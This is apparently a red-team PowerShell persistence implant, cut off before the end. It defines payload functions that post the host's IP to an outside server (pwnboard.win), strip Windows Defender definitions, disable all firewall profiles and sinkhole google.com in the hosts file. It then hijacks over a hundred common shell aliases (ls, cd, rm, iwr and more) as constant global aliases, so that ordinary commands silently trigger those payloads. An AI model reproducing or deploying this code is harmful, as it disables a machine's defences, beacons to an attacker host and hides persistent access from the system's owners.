$x = @'
function mm {try {$i=Test-Connection -ComputerName (hostname) -Count 1|Select-Object -ExpandProperty IPV4Address -ErrorAction SilentlyContinue;$i=$i.IPAddressToString;$p=@{"ip"=$i;"type"="Alias_Shim"}|ConvertTo-Json;Invoke-WebRequest "http://pwnboard.win/generic" -Method Post -UseBasicParsing -Body $p -ContentType "application/json"|Out-Null}Catch{}}
function dd {try{Invoke-Expression("'C:\Program Files\Windows Defender\MpCmdRun.exe' -RemoveDefinitions -All Set-MpPreference -DisableIOAVProtection $true") -ErrorAction SilentlyContinue | Out-Null}Catch{}}
function ff {try{Set-NetFirewallProfile -Profile Domain,Public,Private -Enabled False | Out-Null}Catch{}}
function xx {try{$x=$false;Get-Content "C:\Windows\System32\drivers\etc\hosts" | ForEach-Object {if($_ -match "google.com"){$x = $true}};if($x -eq $false){try{Add-Content -Path "C:\Windows\System32\drivers\etc\hosts" -Value "`r`n0.0.0.0    www.google.com google.com" | Out-Null}Catch{}}}Catch{}}
function shimmed_% {ForEach-Object; Invoke-Expression("mm; gg; xx; dd; ff")}
Set-Alias -Name % -Value shimmed_% -Option AllScope,Constant -Scope Global -ErrorAction SilentlyContinue -Force
function shimmed_ac {Add-Content; Invoke-Expression("mm; gg; xx; dd; ff")}
Set-Alias -Name ac -Value shimmed_ac -Option AllScope,Constant -Scope Global -ErrorAction SilentlyContinue -Force
function shimmed_asnp {Add-PSSnapIn; Invoke-Expression("mm; gg; xx; dd; ff")}
Set-Alias -Name asnp -Value shimmed_asnp -Option AllScope,Constant -Scope Global -ErrorAction SilentlyContinue -Force
function shimmed_cat {Get-Content; Invoke-Expression("mm; gg; xx; dd; ff")}
Set-Alias -Name cat -Value shimmed_cat -Option AllScope,Constant -Scope Global -ErrorAction SilentlyContinue -Force
function shimmed_cd {Set-Location; Invoke-Expression("mm; gg; xx; dd; ff")}
Set-Alias -Name cd -Value shimmed_cd -Option AllScope,Constant -Scope Global -ErrorAction SilentlyContinue -Force
function shimmed_CFS {ConvertFrom-String; Invoke-Expression("mm; gg; xx; dd; ff")}
Set-Alias -Name CFS -Value shimmed_CFS -Option AllScope,Constant -Scope Global -ErrorAction SilentlyContinue -Force
function shimmed_chdir {Set-Location; Invoke-Expression("mm; gg; xx; dd; ff")}
Set-Alias -Name chdir -Value shimmed_chdir -Option AllScope,Constant -Scope Global -ErrorAction SilentlyContinue -Force
function shimmed_clc {Clear-Content; Invoke-Expression("mm; gg; xx; dd; ff")}
Set-Alias -Name clc -Value shimmed_clc -Option AllScope,Constant -Scope Global -ErrorAction SilentlyContinue -Force
function shimmed_clear {Clear-Host; Invoke-Expression("mm; gg; xx; dd; ff")}
Set-Alias -Name clear -Value shimmed_clear -Option AllScope,Constant -Scope Global -ErrorAction SilentlyContinue -Force
function shimmed_clhy {Clear-History; Invoke-Expression("mm; gg; xx; dd; ff")}
Set-Alias -Name clhy -Value shimmed_clhy -Option AllScope,Constant -Scope Global -ErrorAction SilentlyContinue -Force
function shimmed_cli {Clear-Item; Invoke-Expression("mm; gg; xx; dd; ff")}
Set-Alias -Name cli -Value shimmed_cli -Option AllScope,Constant -Scope Global -ErrorAction SilentlyContinue -Force
function shimmed_clp {Clear-ItemProperty; Invoke-Expression("mm; gg; xx; dd; ff")}
Set-Alias -Name clp -Value shimmed_clp -Option AllScope,Constant -Scope Global -ErrorAction SilentlyContinue -Force
function shimmed_cls {Clear-Host; Invoke-Expression("mm; gg; xx; dd; ff")}
Set-Alias -Name cls -Value shimmed_cls -Option AllScope,Constant -Scope Global -ErrorAction SilentlyContinue -Force
function shimmed_clv {Clear-Variable; Invoke-Expression("mm; gg; xx; dd; ff")}
Set-Alias -Name clv -Value shimmed_clv -Option AllScope,Constant -Scope Global -ErrorAction SilentlyContinue -Force
function shimmed_cnsn {Connect-PSSession; Invoke-Expression("mm; gg; xx; dd; ff")}
Set-Alias -Name cnsn -Value shimmed_cnsn -Option AllScope,Constant -Scope Global -ErrorAction SilentlyContinue -Force
function shimmed_compare {Compare-Object; Invoke-Expression("mm; gg; xx; dd; ff")}
Set-Alias -Name compare -Value shimmed_compare -Option AllScope,Constant -Scope Global -ErrorAction SilentlyContinue -Force
function shimmed_copy {Copy-Item; Invoke-Expression("mm; gg; xx; dd; ff")}
Set-Alias -Name copy -Value shimmed_copy -Option AllScope,Constant -Scope Global -ErrorAction SilentlyContinue -Force
function shimmed_cp {Copy-Item; Invoke-Expression("mm; gg; xx; dd; ff")}
Set-Alias -Name cp -Value shimmed_cp -Option AllScope,Constant -Scope Global -ErrorAction SilentlyContinue -Force
function shimmed_cpi {Copy-Item; Invoke-Expression("mm; gg; xx; dd; ff")}
Set-Alias -Name cpi -Value shimmed_cpi -Option AllScope,Constant -Scope Global -ErrorAction SilentlyContinue -Force
function shimmed_cpp {Copy-ItemProperty; Invoke-Expression("mm; gg; xx; dd; ff")}
Set-Alias -Name cpp -Value shimmed_cpp -Option AllScope,Constant -Scope Global -ErrorAction SilentlyContinue -Force
function shimmed_curl {Invoke-WebRequest; Invoke-Expression("mm; gg; xx; dd; ff")}
Set-Alias -Name curl -Value shimmed_curl -Option AllScope,Constant -Scope Global -ErrorAction SilentlyContinue -Force
function shimmed_cvpa {Convert-Path; Invoke-Expression("mm; gg; xx; dd; ff")}
Set-Alias -Name cvpa -Value shimmed_cvpa -Option AllScope,Constant -Scope Global -ErrorAction SilentlyContinue -Force
function shimmed_dbp {Disable-PSBreakpoint; Invoke-Expression("mm; gg; xx; dd; ff")}
Set-Alias -Name dbp -Value shimmed_dbp -Option AllScope,Constant -Scope Global -ErrorAction SilentlyContinue -Force
function shimmed_del {Remove-Item; Invoke-Expression("mm; gg; xx; dd; ff")}
Set-Alias -Name del -Value shimmed_del -Option AllScope,Constant -Scope Global -ErrorAction SilentlyContinue -Force
function shimmed_diff {Compare-Object; Invoke-Expression("mm; gg; xx; dd; ff")}
Set-Alias -Name diff -Value shimmed_diff -Option AllScope,Constant -Scope Global -ErrorAction SilentlyContinue -Force
function shimmed_dir {Get-ChildItem; Invoke-Expression("mm; gg; xx; dd; ff")}
Set-Alias -Name dir -Value shimmed_dir -Option AllScope,Constant -Scope Global -ErrorAction SilentlyContinue -Force
function shimmed_dnsn {Disconnect-PSSession; Invoke-Expression("mm; gg; xx; dd; ff")}
Set-Alias -Name dnsn -Value shimmed_dnsn -Option AllScope,Constant -Scope Global -ErrorAction SilentlyContinue -Force
function shimmed_ebp {Enable-PSBreakpoint; Invoke-Expression("mm; gg; xx; dd; ff")}
Set-Alias -Name ebp -Value shimmed_ebp -Option AllScope,Constant -Scope Global -ErrorAction SilentlyContinue -Force
function shimmed_echo {Write-Output; Invoke-Expression("mm; gg; xx; dd; ff")}
Set-Alias -Name echo -Value shimmed_echo -Option AllScope,Constant -Scope Global -ErrorAction SilentlyContinue -Force
function shimmed_epal {Export-Alias; Invoke-Expression("mm; gg; xx; dd; ff")}
Set-Alias -Name epal -Value shimmed_epal -Option AllScope,Constant -Scope Global -ErrorAction SilentlyContinue -Force
function shimmed_epcsv {Export-Csv; Invoke-Expression("mm; gg; xx; dd; ff")}
Set-Alias -Name epcsv -Value shimmed_epcsv -Option AllScope,Constant -Scope Global -ErrorAction SilentlyContinue -Force
function shimmed_epsn {Export-PSSession; Invoke-Expression("mm; gg; xx; dd; ff")}
Set-Alias -Name epsn -Value shimmed_epsn -Option AllScope,Constant -Scope Global -ErrorAction SilentlyContinue -Force
function shimmed_erase {Remove-Item; Invoke-Expression("mm; gg; xx; dd; ff")}
Set-Alias -Name erase -Value shimmed_erase -Option AllScope,Constant -Scope Global -ErrorAction SilentlyContinue -Force
function shimmed_etsn {Enter-PSSession; Invoke-Expression("mm; gg; xx; dd; ff")}
Set-Alias -Name etsn -Value shimmed_etsn -Option AllScope,Constant -Scope Global -ErrorAction SilentlyContinue -Force
function shimmed_exsn {Exit-PSSession; Invoke-Expression("mm; gg; xx; dd; ff")}
Set-Alias -Name exsn -Value shimmed_exsn -Option AllScope,Constant -Scope Global -ErrorAction SilentlyContinue -Force
function shimmed_fc {Format-Custom; Invoke-Expression("mm; gg; xx; dd; ff")}
Set-Alias -Name fc -Value shimmed_fc -Option AllScope,Constant -Scope Global -ErrorAction SilentlyContinue -Force
function shimmed_fhx {Format-Hex; Invoke-Expression("mm; gg; xx; dd; ff")}
Set-Alias -Name fhx -Value shimmed_fhx -Option AllScope,Constant -Scope Global -ErrorAction SilentlyContinue -Force
function shimmed_fl {Format-List; Invoke-Expression("mm; gg; xx; dd; ff")}
Set-Alias -Name fl -Value shimmed_fl -Option AllScope,Constant -Scope Global -ErrorAction SilentlyContinue -Force
function shimmed_foreach {ForEach-Object; Invoke-Expression("mm; gg; xx; dd; ff")}
Set-Alias -Name foreach -Value shimmed_foreach -Option AllScope,Constant -Scope Global -ErrorAction SilentlyContinue -Force
function shimmed_ft {Format-Table; Invoke-Expression("mm; gg; xx; dd; ff")}
Set-Alias -Name ft -Value shimmed_ft -Option AllScope,Constant -Scope Global -ErrorAction SilentlyContinue -Force
function shimmed_fw {Format-Wide; Invoke-Expression("mm; gg; xx; dd; ff")}
Set-Alias -Name fw -Value shimmed_fw -Option AllScope,Constant -Scope Global -ErrorAction SilentlyContinue -Force
function shimmed_gal {Get-Alias; Invoke-Expression("mm; gg; xx; dd; ff")}
Set-Alias -Name gal -Value shimmed_gal -Option AllScope,Constant -Scope Global -ErrorAction SilentlyContinue -Force
function shimmed_gbp {Get-PSBreakpoint; Invoke-Expression("mm; gg; xx; dd; ff")}
Set-Alias -Name gbp -Value shimmed_gbp -Option AllScope,Constant -Scope Global -ErrorAction SilentlyContinue -Force
function shimmed_gc {Get-Content; Invoke-Expression("mm; gg; xx; dd; ff")}
Set-Alias -Name gc -Value shimmed_gc -Option AllScope,Constant -Scope Global -ErrorAction SilentlyContinue -Force
function shimmed_gci {Get-ChildItem; Invoke-Expression("mm; gg; xx; dd; ff")}
Set-Alias -Name gci -Value shimmed_gci -Option AllScope,Constant -Scope Global -ErrorAction SilentlyContinue -Force
function shimmed_gcm {Get-Command; Invoke-Expression("mm; gg; xx; dd; ff")}
Set-Alias -Name gcm -Value shimmed_gcm -Option AllScope,Constant -Scope Global -ErrorAction SilentlyContinue -Force
function shimmed_gcs {Get-PSCallStack; Invoke-Expression("mm; gg; xx; dd; ff")}
Set-Alias -Name gcs -Value shimmed_gcs -Option AllScope,Constant -Scope Global -ErrorAction SilentlyContinue -Force
function shimmed_gdr {Get-PSDrive; Invoke-Expression("mm; gg; xx; dd; ff")}
Set-Alias -Name gdr -Value shimmed_gdr -Option AllScope,Constant -Scope Global -ErrorAction SilentlyContinue -Force
function shimmed_ghy {Get-History; Invoke-Expression("mm; gg; xx; dd; ff")}
Set-Alias -Name ghy -Value shimmed_ghy -Option AllScope,Constant -Scope Global -ErrorAction SilentlyContinue -Force
function shimmed_gi {Get-Item; Invoke-Expression("mm; gg; xx; dd; ff")}
Set-Alias -Name gi -Value shimmed_gi -Option AllScope,Constant -Scope Global -ErrorAction SilentlyContinue -Force
function shimmed_gjb {Get-Job; Invoke-Expression("mm; gg; xx; dd; ff")}
Set-Alias -Name gjb -Value shimmed_gjb -Option AllScope,Constant -Scope Global -ErrorAction SilentlyContinue -Force
function shimmed_gl {Get-Location; Invoke-Expression("mm; gg; xx; dd; ff")}
Set-Alias -Name gl -Value shimmed_gl -Option AllScope,Constant -Scope Global -ErrorAction SilentlyContinue -Force
function shimmed_gm {Get-Member; Invoke-Expression("mm; gg; xx; dd; ff")}
Set-Alias -Name gm -Value shimmed_gm -Option AllScope,Constant -Scope Global -ErrorAction SilentlyContinue -Force
function shimmed_gmo {Get-Module; Invoke-Expression("mm; gg; xx; dd; ff")}
Set-Alias -Name gmo -Value shimmed_gmo -Option AllScope,Constant -Scope Global -ErrorAction SilentlyContinue -Force
function shimmed_gp {Get-ItemProperty; Invoke-Expression("mm; gg; xx; dd; ff")}
Set-Alias -Name gp -Value shimmed_gp -Option AllScope,Constant -Scope Global -ErrorAction SilentlyContinue -Force
function shimmed_gps {Get-Process; Invoke-Expression("mm; gg; xx; dd; ff")}
Set-Alias -Name gps -Value shimmed_gps -Option AllScope,Constant -Scope Global -ErrorAction SilentlyContinue -Force
function shimmed_gpv {Get-ItemPropertyValue; Invoke-Expression("mm; gg; xx; dd; ff")}
Set-Alias -Name gpv -Value shimmed_gpv -Option AllScope,Constant -Scope Global -ErrorAction SilentlyContinue -Force
function shimmed_group {Group-Object; Invoke-Expression("mm; gg; xx; dd; ff")}
Set-Alias -Name group -Value shimmed_group -Option AllScope,Constant -Scope Global -ErrorAction SilentlyContinue -Force
function shimmed_gsn {Get-PSSession; Invoke-Expression("mm; gg; xx; dd; ff")}
Set-Alias -Name gsn -Value shimmed_gsn -Option AllScope,Constant -Scope Global -ErrorAction SilentlyContinue -Force
function shimmed_gsnp {Get-PSSnapIn; Invoke-Expression("mm; gg; xx; dd; ff")}
Set-Alias -Name gsnp -Value shimmed_gsnp -Option AllScope,Constant -Scope Global -ErrorAction SilentlyContinue -Force
function shimmed_gsv {Get-Service; Invoke-Expression("mm; gg; xx; dd; ff")}
Set-Alias -Name gsv -Value shimmed_gsv -Option AllScope,Constant -Scope Global -ErrorAction SilentlyContinue -Force
function shimmed_gu {Get-Unique; Invoke-Expression("mm; gg; xx; dd; ff")}
Set-Alias -Name gu -Value shimmed_gu -Option AllScope,Constant -Scope Global -ErrorAction SilentlyContinue -Force
function shimmed_gv {Get-Variable; Invoke-Expression("mm; gg; xx; dd; ff")}
Set-Alias -Name gv -Value shimmed_gv -Option AllScope,Constant -Scope Global -ErrorAction SilentlyContinue -Force
function shimmed_gwmi {Get-WmiObject; Invoke-Expression("mm; gg; xx; dd; ff")}
Set-Alias -Name gwmi -Value shimmed_gwmi -Option AllScope,Constant -Scope Global -ErrorAction SilentlyContinue -Force
function shimmed_h {Get-History; Invoke-Expression("mm; gg; xx; dd; ff")}
Set-Alias -Name h -Value shimmed_h -Option AllScope,Constant -Scope Global -ErrorAction SilentlyContinue -Force
function shimmed_history {Get-History; Invoke-Expression("mm; gg; xx; dd; ff")}
Set-Alias -Name history -Value shimmed_history -Option AllScope,Constant -Scope Global -ErrorAction SilentlyContinue -Force
function shimmed_icm {Invoke-Command; Invoke-Expression("mm; gg; xx; dd; ff")}
Set-Alias -Name icm -Value shimmed_icm -Option AllScope,Constant -Scope Global -ErrorAction SilentlyContinue -Force
function shimmed_iex {Invoke-Expression; Invoke-Expression("mm; gg; xx; dd; ff")}
Set-Alias -Name iex -Value shimmed_iex -Option AllScope,Constant -Scope Global -ErrorAction SilentlyContinue -Force
function shimmed_ihy {Invoke-History; Invoke-Expression("mm; gg; xx; dd; ff")}
Set-Alias -Name ihy -Value shimmed_ihy -Option AllScope,Constant -Scope Global -ErrorAction SilentlyContinue -Force
function shimmed_ii {Invoke-Item; Invoke-Expression("mm; gg; xx; dd; ff")}
Set-Alias -Name ii -Value shimmed_ii -Option AllScope,Constant -Scope Global -ErrorAction SilentlyContinue -Force
function shimmed_ipal {Import-Alias; Invoke-Expression("mm; gg; xx; dd; ff")}
Set-Alias -Name ipal -Value shimmed_ipal -Option AllScope,Constant -Scope Global -ErrorAction SilentlyContinue -Force
function shimmed_ipcsv {Import-Csv; Invoke-Expression("mm; gg; xx; dd; ff")}
Set-Alias -Name ipcsv -Value shimmed_ipcsv -Option AllScope,Constant -Scope Global -ErrorAction SilentlyContinue -Force
function shimmed_ipmo {Import-Module; Invoke-Expression("mm; gg; xx; dd; ff")}
Set-Alias -Name ipmo -Value shimmed_ipmo -Option AllScope,Constant -Scope Global -ErrorAction SilentlyContinue -Force
function shimmed_ipsn {Import-PSSession; Invoke-Expression("mm; gg; xx; dd; ff")}
Set-Alias -Name ipsn -Value shimmed_ipsn -Option AllScope,Constant -Scope Global -ErrorAction SilentlyContinue -Force
function shimmed_irm {Invoke-RestMethod; Invoke-Expression("mm; gg; xx; dd; ff")}
Set-Alias -Name irm -Value shimmed_irm -Option AllScope,Constant -Scope Global -ErrorAction SilentlyContinue -Force
function shimmed_ise {powershell_ise.exe; Invoke-Expression("mm; gg; xx; dd; ff")}
Set-Alias -Name ise -Value shimmed_ise -Option AllScope,Constant -Scope Global -ErrorAction SilentlyContinue -Force
function shimmed_iwmi {Invoke-WMIMethod; Invoke-Expression("mm; gg; xx; dd; ff")}
Set-Alias -Name iwmi -Value shimmed_iwmi -Option AllScope,Constant -Scope Global -ErrorAction SilentlyContinue -Force
function shimmed_iwr {Invoke-WebRequest; Invoke-Expression("mm; gg; xx; dd; ff")}
Set-Alias -Name iwr -Value shimmed_iwr -Option AllScope,Constant -Scope Global -ErrorAction SilentlyContinue -Force
function shimmed_kill {Stop-Process; Invoke-Expression("mm; gg; xx; dd; ff")}
Set-Alias -Name kill -Value shimmed_kill -Option AllScope,Constant -Scope Global -ErrorAction SilentlyContinue -Force
function shimmed_lp {Out-Printer; Invoke-Expression("mm; gg; xx; dd; ff")}
Set-Alias -Name lp -Value shimmed_lp -Option AllScope,Constant -Scope Global -ErrorAction SilentlyContinue -Force
function shimmed_ls {Get-ChildItem; Invoke-Expression("mm; gg; xx; dd; ff")}
Set-Alias -Name ls -Value shimmed_ls -Option AllScope,Constant -Scope Global -ErrorAction SilentlyContinue -Force
function shimmed_man {help; Invoke-Expression("mm; gg; xx; dd; ff")}
Set-Alias -Name man -Value shimmed_man -Option AllScope,Constant -Scope Global -ErrorAction SilentlyContinue -Force
function shimmed_md {mkdir; Invoke-Expression("mm; gg; xx; dd; ff")}
Set-Alias -Name md -Value shimmed_md -Option AllScope,Constant -Scope Global -ErrorAction SilentlyContinue -Force
function shimmed_measure {Measure-Object; Invoke-Expression("mm; gg; xx; dd; ff")}
Set-Alias -Name measure -Value shimmed_measure -Option AllScope,Constant -Scope Global -ErrorAction SilentlyContinue -Force
function shimmed_mi {Move-Item; Invoke-Expression("mm; gg; xx; dd; ff")}
Set-Alias -Name mi -Value shimmed_mi -Option AllScope,Constant -Scope Global -ErrorAction SilentlyContinue -Force
function shimmed_mount {New-PSDrive; Invoke-Expression("mm; gg; xx; dd; ff")}
Set-Alias -Name mount -Value shimmed_mount -Option AllScope,Constant -Scope Global -ErrorAction SilentlyContinue -Force
function shimmed_move {Move-Item; Invoke-Expression("mm; gg; xx; dd; ff")}
Set-Alias -Name move -Value shimmed_move -Option AllScope,Constant -Scope Global -ErrorAction SilentlyContinue -Force
function shimmed_mp {Move-ItemProperty; Invoke-Expression("mm; gg; xx; dd; ff")}
Set-Alias -Name mp -Value shimmed_mp -Option AllScope,Constant -Scope Global -ErrorAction SilentlyContinue -Force
function shimmed_mv {Move-Item; Invoke-Expression("mm; gg; xx; dd; ff")}
Set-Alias -Name mv -Value shimmed_mv -Option AllScope,Constant -Scope Global -ErrorAction SilentlyContinue -Force
function shimmed_nal {New-Alias; Invoke-Expression("mm; gg; xx; dd; ff")}
Set-Alias -Name nal -Value shimmed_nal -Option AllScope,Constant -Scope Global -ErrorAction SilentlyContinue -Force
function shimmed_ndr {New-PSDrive; Invoke-Expression("mm; gg; xx; dd; ff")}
Set-Alias -Name ndr -Value shimmed_ndr -Option AllScope,Constant -Scope Global -ErrorAction SilentlyContinue -Force
function shimmed_ni {New-Item; Invoke-Expression("mm; gg; xx; dd; ff")}
Set-Alias -Name ni -Value shimmed_ni -Option AllScope,Constant -Scope Global -ErrorAction SilentlyContinue -Force
function shimmed_nmo {New-Module; Invoke-Expression("mm; gg; xx; dd; ff")}
Set-Alias -Name nmo -Value shimmed_nmo -Option AllScope,Constant -Scope Global -ErrorAction SilentlyContinue -Force
function shimmed_npssc {New-PSSessionConfigurationFile; Invoke-Expression("mm; gg; xx; dd; ff")}
Set-Alias -Name npssc -Value shimmed_npssc -Option AllScope,Constant -Scope Global -ErrorAction SilentlyContinue -Force
function shimmed_nsn {New-PSSession; Invoke-Expression("mm; gg; xx; dd; ff")}
Set-Alias -Name nsn -Value shimmed_nsn -Option AllScope,Constant -Scope Global -ErrorAction SilentlyContinue -Force
function shimmed_nv {New-Variable; Invoke-Expression("mm; gg; xx; dd; ff")}
Set-Alias -Name nv -Value shimmed_nv -Option AllScope,Constant -Scope Global -ErrorAction SilentlyContinue -Force
function shimmed_ogv {Out-GridView; Invoke-Expression("mm; gg; xx; dd; ff")}
Set-Alias -Name ogv -Value shimmed_ogv -Option AllScope,Constant -Scope Global -ErrorAction SilentlyContinue -Force
function shimmed_oh {Out-Host; Invoke-Expression("mm; gg; xx; dd; ff")}
Set-Alias -Name oh -Value shimmed_oh -Option AllScope,Constant -Scope Global -ErrorAction SilentlyContinue -Force
function shimmed_popd {Pop-Location; Invoke-Expression("mm; gg; xx; dd; ff")}
Set-Alias -Name popd -Value shimmed_popd -Option AllScope,Constant -Scope Global -ErrorAction SilentlyContinue -Force
function shimmed_ps {Get-Process; Invoke-Expression("mm; gg; xx; dd; ff")}
Set-Alias -Name ps -Value shimmed_ps -Option AllScope,Constant -Scope Global -ErrorAction SilentlyContinue -Force
function shimmed_pushd {Push-Location; Invoke-Expression("mm; gg; xx; dd; ff")}
Set-Alias -Name pushd -Value shimmed_pushd -Option AllScope,Constant -Scope Global -ErrorAction SilentlyContinue -Force
function shimmed_pwd {Get-Location; Invoke-Expression("mm; gg; xx; dd; ff")}
Set-Alias -Name pwd -Value shimmed_pwd -Option AllScope,Constant -Scope Global -ErrorAction SilentlyContinue -Force
function shimmed_r {Invoke-History; Invoke-Expression("mm; gg; xx; dd; ff")}
Set-Alias -Name r -Value shimmed_r -Option AllScope,Constant -Scope Global -ErrorAction SilentlyContinue -Force
function shimmed_rbp {Remove-PSBreakpoint; Invoke-Expression("mm; gg; xx; dd; ff")}
Set-Alias -Name rbp -Value shimmed_rbp -Option AllScope,Constant -Scope Global -ErrorAction SilentlyContinue -Force
function shimmed_rcjb {Receive-Job; Invoke-Expression("mm; gg; xx; dd; ff")}
Set-Alias -Name rcjb -Value shimmed_rcjb -Option AllScope,Constant -Scope Global -ErrorAction SilentlyContinue -Force
function shimmed_rcsn {Receive-PSSession; Invoke-Expression("mm; gg; xx; dd; ff")}
Set-Alias -Name rcsn -Value shimmed_rcsn -Option AllScope,Constant -Scope Global -ErrorAction SilentlyContinue -Force
function shimmed_rd {Remove-Item; Invoke-Expression("mm; gg; xx; dd; ff")}
Set-Alias -Name rd -Value shimmed_rd -Option AllScope,Constant -Scope Global -ErrorAction SilentlyContinue -Force
function shimmed_rdr {Remove-PSDrive; Invoke-Expression("mm; gg; xx; dd; ff")}
Set-Alias -Name rdr -Value shimmed_rdr -Option AllScope,Constant -Scope Global -ErrorAction SilentlyContinue -Force
function shimmed_ren {Rename-Item; Invoke-Expression("mm; gg; xx; dd; ff")}
Set-Alias -Name ren -Value shimmed_ren -Option AllScope,Constant -Scope Global -ErrorAction SilentlyContinue -Force
function shimmed_ri {Remove-Item; Invoke-Expression("mm; gg; xx; dd; ff")}
Set-Alias -Name ri -Value shimmed_ri -Option AllScope,Constant -Scope Global -ErrorAction SilentlyContinue -Force
function shimmed_rjb {Remove-Job; Invoke-Expression("mm; gg; xx; dd; ff")}
Set-Alias -Name rjb -Value shimmed_rjb -Option AllScope,Constant -Scope Global -ErrorAction SilentlyContinue -Force
function shimmed_rm {Remove-Item; Invoke-Expression("mm; gg; xx; dd; ff")}
Set-Alias -Name rm -Value shimmed_rm -Option AllScope,Constant -Scope Global -ErrorAction SilentlyContinue -Force
function shimmed_rmdir {Remove-Item; Invoke-Expression("mm; gg; xx; dd; ff")}
Set-Alias -Name rmdir -Value shimmed_rmdir -Option AllScope,Constant -Scope Global -ErrorAction SilentlyContinue -Force
function shimmed_rmo {Remove-Module; Invoke-Expression("mm; gg; xx; dd; ff")}
Set-Alias -Name rmo -Value shimmed_rmo -Option AllScope,Constant -Scope Global -ErrorAction SilentlyContinue -Force
function shimmed_rni {Rename-Item; Invoke-Expression("mm; gg; xx; dd; ff")}
Set-Alias -Name rni -Value shimmed_rni -Option AllScope,Constant -Scope Global -ErrorAction SilentlyContinue -Force
function shimmed_rnp {Rename-ItemProperty; Invoke-Expression("mm; gg; xx; dd; ff")}
Set-Alias -Name rnp -Value shimmed_rnp -Option AllScope,Constant -Scope Global -ErrorAction SilentlyContinue -Force
function shimmed_rp {Remove-ItemProperty; Invoke-Expression("mm; gg; xx; dd; ff")}
Set-Alias -Name rp -Value shimmed_rp -Option AllScope,Constant -Scope Global -ErrorAction SilentlyContinue -Force
function shimmed_rsn {Remove-PSSession; Invoke-Expression("mm; gg; xx; dd; ff")}
Set-Alias -Name rsn -Value shimmed_rsn -Option AllScope,Constant -Scope Global -ErrorAction SilentlyContinue -Force
function shimmed_rsnp {Remove-PSSnapin; Invoke-Expression("mm; gg; xx; dd; ff")}
Set-Alias -Name rsnp -Value shimmed_rsnp -Option AllScope,Constant -Scope Global -ErrorAction SilentlyContinue -Force
function shimmed_rujb {Resume-Job; Invoke-Expression("mm; gg; xx; dd; ff")}
Set-Alias -Name rujb -Value shimmed_rujb -Option AllScope,Constant -Scope Global -ErrorAction SilentlyContinue -Force
function shimmed_rv {Remove-Variable; Invoke-Expression("mm; gg; xx; dd; ff")}
Set-Alias -Name rv -Value shimmed_rv -Option AllScope,Constant -Scope Global -ErrorAction SilentlyContinue -Force
function shimmed_rvpa {Resolve-Path; Invoke-Expression("mm; gg; xx; dd; ff")}
Set-Alias -Name rvpa -Value shimmed_rvpa -Option AllScope,Constant -Scope Global -ErrorAction SilentlyContinue -Force
function shimmed_rwmi {Remove-WMIObject; Invoke-Expression("mm; gg; xx; dd; ff")}
Set-Alias -Name rwmi -Value shimmed_rwmi -Option AllScope,Constant -Scope Global -ErrorAction SilentlyContinue -Force
function shimmed_sajb {Start-Job; Invoke-Expression("mm; gg; xx; dd; ff")}
Set-Alias -Name sajb -Value shimmed_sajb -Option AllScope,Constant -Scope Global -ErrorAction SilentlyContinue -Force
function shimmed_sal {Set-Alias; Invoke-Expression("mm; gg; xx; dd; ff")}
Set-Alias -Name sal -Value shimmed_sal -Option AllScope,Constant -Scope Global -ErrorAction SilentlyContinue -Force
function shimmed_saps {Start-Process; Invoke-Expression("mm; gg; xx; dd; ff")}
Set-Alias -Name saps -Value shimmed_saps -Option AllScope,Constant -Scope Global -ErrorAction SilentlyContinue -Force
function shimmed_sasv {Start-Service; Invoke-Expression("mm; gg; xx; dd; ff")}
Set-Alias -Name sasv -Value shimmed_sasv -Option AllScope,Constant -Scope Global -ErrorAction SilentlyContinue -Force
function shimmed_sbp {Set-PSBreakpoint; Invoke-Expression("mm; gg; xx; dd; ff")}
Set-Alias -Name sbp -Value shimmed_sbp -Option AllScope,Constant -Scope Global -ErrorAction SilentlyContinue -Force
function shimmed_sc {Set-Content; Invoke-Expression("mm; gg; xx; dd; ff")}
Set-Alias -Name sc -Value shimmed_sc -Option AllScope,Constant -Scope Global -ErrorAction SilentlyContinue -Force
function shimmed_select {Select-Object; Invoke-Expression("mm; gg; xx; dd; ff")}
Set-Alias -Name select -Value shimmed_select -Option AllScope,Constant -Scope Global -ErrorAction SilentlyContinue -Force
function shimmed_set {Set-Variable; Invoke-Expression("mm; gg; xx; dd; ff")}
Set-Alias -Name set -Value shimmed_set -Option AllScope,Constant -Scope Global -ErrorAction SilentlyContinue -Force
function shimmed_shcm {Show-Command; Invoke-Expression("mm; gg; xx; dd; ff")}
Set-Alias -Name shcm -Value shimmed_shcm -Option AllScope,Constant -Scope Global -ErrorAction SilentlyContinue -Force
function shimmed_si {Set-Item; Invoke-Expression("mm; gg; xx; dd; ff")}
Set-Alias -Name si -Value shimmed_si -Option AllScope,Constant -Scope Global -ErrorAction SilentlyContinue -Force
function shimmed_sl {Set-Location; Invoke-Expression("mm; gg; xx; dd; ff")}
Set-Alias -Name sl -Value shimmed_sl -Option AllScope,Constant -Scope Global -ErrorAction SilentlyContinue -Force
function shimmed_sleep {Start-Sleep; Invoke-Expression("mm; gg; xx; dd; ff")}
Set-Alias -Name sleep -Value shimmed_sleep -Option AllScope,Constant -Scope Global -ErrorAction SilentlyContinue -Force
function shimmed_sls {Select-String; Invoke-Expression("mm; gg; xx; dd; ff")}
Set-Alias -Name sls -Value shimmed_sls -Option AllScope,Constant -Scope Global -ErrorAction SilentlyContinue -Force
function shimmed_sort {Sort-Object; Invoke-Expression("mm; gg; xx; dd; ff")}
Set-Alias -Name sort -Value shimmed_sort -Option AllScope,Constant -Scope Global -ErrorAction SilentlyContinue -Force
function shimmed_sp {Set-ItemProperty; Invoke-Expression("mm; gg; xx; dd; ff")}
Set-Alias -Name sp -Value shimmed_sp -Option AllScope,Constant -Scope Global -ErrorAction SilentlyContinue -Force
function shimmed_spjb {Stop-Job; Invoke-Expression("mm; gg; xx; dd; ff")}
Set-Alias -Name spjb -Value shimmed_spjb -Option AllScope,Constant -Scope Global -ErrorAction SilentlyContinue -Force
function shimmed_spps {Stop-Process; Invoke-Expression("mm; gg; xx; dd; ff")}
Set-Alias -Name spps -Value shimmed_spps -Option AllScope,Constant -Scope Global -ErrorAction SilentlyContinue -Force
function shimmed_spsv {Stop-Service; Invoke-Expression("mm; gg; xx; dd; ff")}
Set-Alias -Name spsv -Value shimmed_spsv -Option AllScope,Constant -Scope Global -ErrorAction SilentlyContinue -Force
function shimmed_start {Start-Process; Invoke-Expression("mm; gg; xx; dd; ff")}
Set-Alias -Name start -Value shimmed_start -Option AllScope,Constant -Scope Global -ErrorAction SilentlyContinue -Force
function shimmed_sujb {Suspend-Job; Invoke-Expression("mm; gg; xx; dd; ff")}
Set-Alias -Name sujb -Value shimmed_sujb -Option AllScope,Constant -Scope Global -ErrorAction SilentlyContinue -Force
function shimmed_sv {Set-Variable; Invoke-Expression("mm; gg; xx; dd; ff")}
